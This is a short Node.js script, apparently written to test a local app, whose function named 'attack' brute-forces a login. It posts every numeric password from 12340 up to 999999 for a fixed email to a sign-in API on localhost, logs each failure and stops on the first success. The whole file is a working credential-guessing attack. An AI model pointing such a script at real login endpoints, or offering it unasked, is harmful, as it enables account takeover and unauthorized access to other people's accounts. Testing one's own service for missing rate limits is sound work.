const axios = require('axios');


const attack = async()=>{
for(let i = 12340 ; i<999999 ;i++){
let password = i.toString();
let data = JSON.stringify({
    "email": "anish@gmail.com",
    "password": password
  });
let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:7000/api/v1/signin',
    headers: { 
      'Content-Type': 'application/json'
    },
    data : data
  };

try{
const response = await axios.request(config);
console.log(`${password} success`,response.data)
break;
}catch(error){
    console.log(`${password} failed`)
}

}
}
attack();